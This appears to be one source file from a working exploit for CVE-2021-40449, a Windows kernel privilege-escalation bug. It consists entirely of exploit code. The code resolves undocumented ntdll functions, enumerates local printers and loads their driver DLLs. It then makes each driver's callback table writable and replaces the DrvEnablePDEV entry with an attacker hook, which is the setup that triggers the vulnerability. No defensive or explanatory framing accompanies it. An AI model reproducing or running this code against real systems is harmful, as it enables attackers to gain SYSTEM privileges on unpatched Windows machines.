#include "def.hpp"
namespace offset = exploit::gadget::X_17763_737;
namespace CVE_2021_40449
{

    bool initAPI() {
        ntdllModule = LoadLibraryExW(L"ntdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (ntdllModule == NULL) {
            puts("[-] Failed to load kernel module");
            return false;
        }
        SetInformationThread = (NtSetInformationThread_t)GetProcAddress(ntdllModule, "NtSetInformationThread");
        QuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdllModule, "NtQuerySystemInformation");

        return true;
    }

    bool findPrinters(DrvEnablePDEV_t hookfunc) {
        DWORD pcbNeeded, pcbReturned, lpflOldProtect, _lpflOldProtect;
        DRVENABLEDATA drvEnableData;

        EnumPrintersW(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &pcbNeeded, &pcbReturned);
        if (pcbNeeded <= 0)
        {
            puts("[-] Failed to find any available printers");
            return false;
        }

        std::vector<PRINTER_INFO_4W> pPrinterEnum(pcbNeeded);
        auto res = EnumPrintersW(PRINTER_ENUM_LOCAL, NULL, 4, (LPBYTE)pPrinterEnum.data(), pcbNeeded, &pcbNeeded, &pcbReturned);
        if (res == false || pcbReturned <= 0)
        {
            puts("[-] Failed to enumerate printers");
            return false;
        }

        for (size_t i = 0; i < pcbReturned; i++)
        {
            auto printerInfo = &pPrinterEnum[i];

            printf("[*] Using printer: %ws\n", printerInfo->pPrinterName);
            // Open printer
            res = OpenPrinterW(printerInfo->pPrinterName, &hPrinter, NULL);
            if (!res)
            {
                puts("[-] Failed to open printer");
                continue;
            }

            printf("[+] Opened printer: %ws\n", printerInfo->pPrinterName);
            printerName = _wcsdup(printerInfo->pPrinterName);

            // Get the printer driver
            GetPrinterDriverW(hPrinter, NULL, 2, NULL, 0, &pcbNeeded);
            std::vector<DRIVER_INFO_2W> driverInfo(pcbNeeded);

            res = GetPrinterDriverW(hPrinter, NULL, 2, (LPBYTE)driverInfo.data(), pcbNeeded, &pcbNeeded);
            if (res == FALSE)
            {
                printf("[-] Failed to get printer driver\n");
                continue;
            }

            printf("[*] Driver DLL: %ws\n", driverInfo[0].pDriverPath);

            // Load the printer driver into memory
            auto hModule = LoadLibraryExW(driverInfo[0].pDriverPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
            if (hModule == NULL)
            {
                printf("[-] Failed to load printer driver\n");
                continue;
            }

            DrvEnableDriver_t DrvEnableDriver = (DrvEnableDriver_t)GetProcAddress(hModule, "DrvEnableDriver");
            VoidFunc_t DrvDisableDriver = (VoidFunc_t)GetProcAddress(hModule, "DrvDisableDriver");
            if (DrvEnableDriver == NULL || DrvDisableDriver == NULL)
            {
                printf("[-] Failed to get exported functions from driver\n");
                continue;
            }


            // Call DrvEnableDriver to get the printer driver's usermode callback table
            res = DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(DRVENABLEDATA), &drvEnableData);

            if (res == FALSE)
            {
                printf("[-] Failed to enable driver\n");
                continue;
            }

            puts("[+] Enabled printer driver");

            // Unprotect the driver's usermode callback table, such that we can overwrite entries
            res = VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), PAGE_READWRITE, &lpflOldProtect);
            if (res == FALSE)
            {
                puts("[-] Failed to unprotect printer driver's usermode callback table");
                continue;
            }

            // start hook
            oldFuncPtr = (DrvEnablePDEV_t)drvEnableData.pdrvfn[0].pfn;
            drvEnableData.pdrvfn[0].pfn = reinterpret_cast<PFN>(hookfunc);


            // Disable driver
            DrvDisableDriver();

            // Restore protections for driver's usermode callback table
            VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), lpflOldProtect, &_lpflOldProtect);

            return true;

        }


        return false;
    }

} // namespace CVE_2021_40449